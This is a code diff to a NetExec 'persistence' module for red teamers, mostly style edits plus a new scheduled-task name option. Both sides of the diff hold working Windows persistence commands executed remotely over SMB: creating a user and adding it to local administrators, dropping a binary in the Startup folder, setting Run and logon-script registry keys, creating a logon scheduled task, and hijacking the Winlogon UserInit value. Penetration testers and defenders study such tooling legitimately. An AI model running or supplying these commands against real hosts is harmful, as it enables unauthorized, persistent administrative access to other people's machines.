@@ -5,12 +5,12 @@ class NXCModule:
     """
     Implements persistence techniques used by APT's and Red Teamers/Pentesters
     
-    Created by Lorenzo Meacci @kapla founder of the 0xH3xSec community!
+    Created by Lorenzo Meacci @kapla founder of the 0xH3xSec community and @FaganAfandiyev
     """
 
-    name = 'persistence'
+    name = "persistence"
     description = "Implements techniques for persistence used by malicious actors"
-    supported_protocols = ['smb']
+    supported_protocols = ["smb"]
     opsec_safe = True
     multiple_hosts = True
 
@@ -23,23 +23,29 @@ class NXCModule:
         4. 'logon_script' - .bat logon script at boot
         5. 'scheduled_task' - Creates a task that trriggers at logon
         6. 'win_logon_userinit' - Modifies the "UserInit" registry of WinLogon
+        USER: String that specifies the user to add.    
+        PASS: String that specifies the password for the user.
+        SCHTASK: String that specifies the name of the scheduled task.
         """
         self.TECHNIQUE = module_options["TECHNIQUE"]
-        self.BINARY = "Do_not_execute"
-        self.user = "kapla2"
-        self.password = "Join_The_0xH3xSec_Community!"
-        self.file = "Do_not_execute"
+        self.BINARY = ""
+        self.user = ""
+        self.password = ""
+        self.file = ""
         self.file_name = ""
-        if 'USER' in module_options:
-            self.user = module_options['USER']
-        if 'PASS' in module_options:
-            self.password = module_options['PASS']
-        if 'BINARY' in module_options:
-            self.BINARY = module_options['BINARY']
-        if 'FILE' in module_options:
-            self.file = module_options['FILE']
-        if 'FILE_NAME' in module_options:
-            self.file_name = module_options['FILE_NAME']
+        self.SCHTASK=self.BINARY
+        if "USER" in module_options:
+            self.user = module_options["USER"]
+        if "PASS" in module_options:
+            self.password = module_options["PASS"]
+        if "BINARY" in module_options:
+            self.BINARY = module_options["BINARY"]
+        if "FILE" in module_options:
+            self.file = module_options["FILE"]
+        if "FILE_NAME" in module_options:
+            self.file_name = module_options["FILE_NAME"]
+        if "SCHTASK" in module_options:
+            self.SCHTASK = module_options["SCHTASK"]
 
         
  
@@ -82,10 +88,10 @@ class NXCModule:
         """
         Adds a new user to the Admin group.
         """
-        if self.user == "kapla2" and self.password == "Join_The_0xH3xSec_Community!":
+        if self.user == "" and self.password == "":
                 context.log.highlight("No credentials were submitted!!! Using default user and default password!!!")
-        context.log.highlight(f'Adding user {self.user}:{self.password} to the Admin group.')
-        command = f'(net user {self.user} "{self.password}" /add /Y && net localgroup administrators {self.user} /add)'
+        context.log.highlight(f"Adding user {self.user}:{self.password} to the Admin group.")
+        command = f"(net user {self.user} \"{self.password}\" /add /Y && net localgroup administrators {self.user} /add)"
         output = connection.execute(command, True)
         context.log.highlight(output)
         
@@ -93,8 +99,8 @@ class NXCModule:
         """
         Puts a malicious binary in the startup folder es BINARY=C:\\Windows\\Tasks\\beacon.exe
         """
-        command = f'copy {self.BINARY} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"'
-        context.log.highlight(f'Adding {self.BINARY} to the Start Up Folder')
+        command = f"copy {self.BINARY} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\""
+        context.log.highlight(f"Adding {self.BINARY} to the Start Up Folder")
         p = connection.execute(command, True)
         context.log.highlight(p)
         
@@ -102,17 +108,17 @@ class NXCModule:
         """
         Modifies the Registry run key to launch the specified binary
         """
-        command = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d {self.BINARY} /f'
-        context.log.highlight(f'adding the {self.BINARY} to the Run Registry')
+        command = f"reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /v MyApp /t REG_SZ /d {self.BINARY} /f"
+        context.log.highlight(f"adding the {self.BINARY} to the Run Registry")
         p = connection.execute(command , True)
         context.log.highlight(p)
     
     def logon_script(self , context , connection):
         """
-        Setup's one of the registry value to the specified .bat file
+        Sets one of the registry value to the specified .bat file
         """
-        command = f'reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "{self.BINARY}" /t REG_SZ /f'
-        context.log.highlight(f'adding the {self.BINARY} to the Logon Script')
+        command = f"reg add \"HKEY_CURRENT_USER\Environment\" /v UserInitMprLogonScript /d \"{self.BINARY}\" /t REG_SZ /f"
+        context.log.highlight(f"adding the {self.BINARY} to the Logon Script")
         p = connection.execute(command , True)
         context.log.highlight(p)
     
@@ -120,14 +126,14 @@ class NXCModule:
         """
         Created a task that triggers at logon
         """
-        command = f'schtasks /create /sc onlogon /tn UpDater2.0 /tr "{self.BINARY}"'
-        context.log.highlight(f'Creating the logon task with the path : {self.BINARY}')
+        command = f"schtasks /create /sc onlogon /tn {self.SCHTASK} /tr \"{self.BINARY}\""
+        context.log.highlight(f"Creating the logon task with the path : {self.BINARY}")
         p = connection.execute(command , True)
         context.log.highlight(p)
     
     def win_logon_userinit(self , context , connection):
-        command = fr'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe,{self.BINARY}" /F'
-        context.log.highlight(fr'Modifying the WinLogon UserInit value to : C:\Windows\system32\userinit.exe ,  {self.BINARY}')
+        command = fr"reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" /V \"UserInit\" /T REG_SZ /D \"C:\Windows\system32\userinit.exe,{self.BINARY}\" /F"
+        context.log.highlight(fr"Modifying the WinLogon UserInit value to : C:\Windows\system32\userinit.exe ,  {self.BINARY}")
         p = connection.execute(command , True)
         context.log.highlight(p)
     
@@ -136,7 +142,7 @@ class NXCModule:
         file_path = f"Windows/Tasks/{self.file_name}" 
     
         # Ensure both FILE and FILE_NAME are provided
-        if self.file == "Do_not_execute" and self.file_name == "":
+        if self.file == "" and self.file_name == "":
             context.log.error("You need to specify the file path FILE= and how you want to save the file on the system FILE_NAME")
             return
 
